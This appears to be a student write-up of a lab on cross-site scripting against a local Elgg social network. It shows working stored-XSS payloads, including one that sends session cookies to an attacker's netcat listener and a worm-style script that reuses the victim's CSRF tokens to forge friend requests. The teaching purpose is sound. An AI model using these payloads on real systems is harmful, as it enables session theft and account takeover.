# Cross-Site Scripting (XSS)

## Setup

We configured the local DNS mapping in the /etc/hosts file to point the lab domains to the container IP, and then built and launched the Docker containers in detached mode.

```bash
$ sudo gedit /etc/hosts # added "10.9.0.5 www.seed-server.com" to the file
$ docker-compose build # build the container image
$ dcup -d #used -d to silently start the container in the background
```
### Target Application and Database Configuration
The target application for this lab is Elgg, an open-source social networking platform accessible at http://www.seed-server.com. The environment is configured to persist MySQL data on the host machine, ensuring that our changes to the database are preserved across container restarts.

## HTTP Request Analysis

To understand the structure of HTTP requests and construct our attacks, we utilized the built-in Firefox Web Developer Network Tool. This allowed us to inspect headers, cookies, and POST parameters (such as authentication tokens) necessary for crafting valid malicious requests, serving the same purpose as the suggested "HTTP Header Live" tool.

## Question 1 - Tasks 1-4 

## Task 1 - Posting a Malicious Message to Display an Alert Window

### Objective
The objective of this task was to test the Elgg application for Stored Cross-Site Scripting (XSS) vulnerabilities by embedding a JavaScript snippet into a user profile. 

### Goal
The goal was to have the script execute automatically whenever the profile is viewed.

### Execution
We logged into the Elgg website using a standard user account (Alice) and navigated to the "Edit Profile" page.

We identified the "Brief Description" field as a potential injection point. We input the following JavaScript code to trigger a pop-up alert window:

```html
<script>alert('XSS');</script>
``` 

After saving the profile, we viewed it (both as the current user and as a different user) to verify the attack.

### Result

Upon loading the profile page, the browser executed the injected JavaScript, and the alert window was displayed immediately. This confirms that the application does not properly sanitize user input in the profile fields, allowing for Stored XSS.

![Task1](https://gitlab.up.pt/class/fsi/2526/t17/t17-group04/-/raw/main/Semana%20%237/Images/Task1.png?ref_type=heads)


## Task 2 - Posting a Malicious Message to Display Cookies

### Objective 
Building upon the previous task, the objective was to modify the malicious JavaScript to access sensitive data stored in the user's browser. Specifically, we aimed to display the user's session cookies in the alert window when they viewed the compromised profile.

### Execution
We edited the "Brief Description" field of the user profile, replacing the previous script with the following one:

```html
<script>alert(document.cookie);</script>
```

### Result

As soon as the profile was saved or viewed by another user, the JavaScript executed. The alert window displayed the current session cookies, specifically the Elgg session ID.

![Task2](https://gitlab.up.pt/class/fsi/2526/t17/t17-group04/-/raw/main/Semana%20%237/Images/Task2.png?ref_type=heads)

### Security Implication
This demonstrates a critical security risk. If an attacker can read document.cookie, they can potentially steal the victim's session identifier (Session Hijacking). Instead of just displaying it in an alert, a real attacker would send this cookie to their own server, allowing them to take over the victim's account. We will demonstrate exactly how to do this in the following task.


## Task 3: Stealing Cookies from the Victim’s Machine

### Objective
The previous task demonstrated that cookies could be accessed via JavaScript, but they were only visible to the user viewing the page. The objective of this task was to extract these cookies to the attacker's machine. To achieve this, we needed the malicious script to send an HTTP request containing the cookies to a server controlled by the attacker.

### Setup: Attacker's Listener
First, on the attacker's machine (IP `10.9.0.1`), we set up a TCP listener using `netcat` to capture incoming requests. We used port `5555`.

```bash
$ nc -lknv 5555
```


-l: Listen for incoming connections.

-k: Keep listening after the current connection closes.

-n: Do not resolve hostnames (IP only).

-v: Verbose output.

#### Connectivity Troubleshooting
Initially, the XSS attack did not trigger a connection on our listener, despite the code being correct. Suspecting a network routing or connectivity issue between the isolated container and the attacker's machine, we forced a connection test to "wake up" the network route using `netcat` in scanning mode:

```bash
$ nc -zvn 10.9.0.1 5555
```
This command successfully established a handshake with our listener.



### Execution

We injected the following code into the "Brief Description" field:
```html
<script>document.write('<img src=http://10.9.0.1:5555?c='
+ escape(document.cookie) + ' >');
</script>
```


#### How this works

1. The browser executes the script.

2. It tries to load the image from http://10.9.0.1:5555.

3. To do this, it sends an HTTP GET request to the attacker's machine.

4. The escape (document.cookie) function ensures the cookies are safely encoded and attached to the URL as the parameter c.

### Result
After saving the profile, we waited for a user (Alice) to view it. As soon as the page loaded, we observed an incoming connection on our netcat terminal.

The output contained the full HTTP GET request, including the stolen session cookie in the URL parameters.

We successfully captured the victim's session ID remotely.

![Task3](https://gitlab.up.pt/class/fsi/2526/t17/t17-group04/-/raw/main/Semana%20%237/Images/Task3.png?ref_type=heads)

## Task 4: Becoming the Victim’s Friend

### Objective
The goal of this task was to create a Cross-Site Scripting (XSS) attack that mimics the behavior of the "Samy Worm" (2005). We aimed to write a script that, when executed by a victim viewing Samy's profile, would automatically send a forged HTTP request to add Samy as a friend, without the victim's consent or knowledge.

### How the "Add Friend" Request works
Before writing the attack script, we needed to understand how the Elgg application handles friend requests. We logged in as a regular user (Alice), visited Samy's profile, and added him as a friend while monitoring the network traffic using the Web Developer Network Tool.
We observed that adding a friend triggers an HTTP GET request to a URL structured like this:
`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1666...&__elgg_token=2f8a...`

Key parameters identified:
* `friend`: The User ID (GUID) of the person being added. We identified Samy's GUID as **59**.
* `__elgg_ts`: A timestamp security token.
* `__elgg_token`: An anti-CSRF security token.

### Attack Script Construction
Using this information, we constructed a JavaScript payload to replicate this request programmatically. The script needed to dynamically fetch the current user's security tokens (`ts` and `token`) to authorize the request.

JavaScript code:

```html
<p><script type="text/javascript">
window.onload = function () {
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // ➀
    var token="&__elgg_token="+elgg.security.token.__elgg_token; // ➁

    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.seed-server.com/action/friends/add)"+"?friend=59"+ts+token+ts+token

    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script></p>
``` 
### Execution
We logged in as Samy and edited his profile. We switched the "About Me" field to Text Mode (Edit HTML) to ensure the script was saved as raw code rather than formatted text. We pasted the script and saved the profile.

Then, we logged in as a different user (Boby) and navigated to Samy's profile. The script executed silently in the background. Upon checking Boby's friend list, Samy had been successfully added.

![Task4](https://gitlab.up.pt/class/fsi/2526/t17/t17-group04/-/raw/main/Semana%20%237/Images/Task4.png?ref_type=heads)

### Question 1
* The application requires every state-changing request (like adding a friend) to include valid __elgg_ts (timestamp) and __elgg_token (token) parameters. These tokens are generated by the server and are unique to the user's current session
* Lines ➀ and ➁ dynamically access these secret values from the elgg JavaScript object available in the victim's browser (elgg.security.token). By extracting these valid tokens and appending them to our forged request, the attack successfully tricks the server into believing the user intentionally initiated the action.

### Question 2
* The Editor mode is designed to sanitize input and format text safely. If we pasted the script directly into the visual editor, it would encode special characters, so the browser would interpret the input as harmless text to be displayed on the screen, rather than executable HTML/JavaScript code. The vulnerability relies on the ability to inject raw HTML tags (`<script>`) that the browser parses as code.

## Question 2 - Different Modalities

### Attack Classification

We classify the specific attack performed here as **Stored XSS (Persistent XSS)**.

**Reasoning:**
 The malicious JavaScript payload is permanently saved in the Elgg database (within the "About Me" field) rather than being reflected from a transient HTTP request. The attack executes automatically whenever a victim views the compromised profile, making it persistent and passive, as it does not require the victim to click on a specific malicious link.

While the script interacts with the DOM (to steal tokens) and performs unauthorized requests (similar to CSRF), the entry point and the nature of the vulnerability are strictly **Stored XSS**.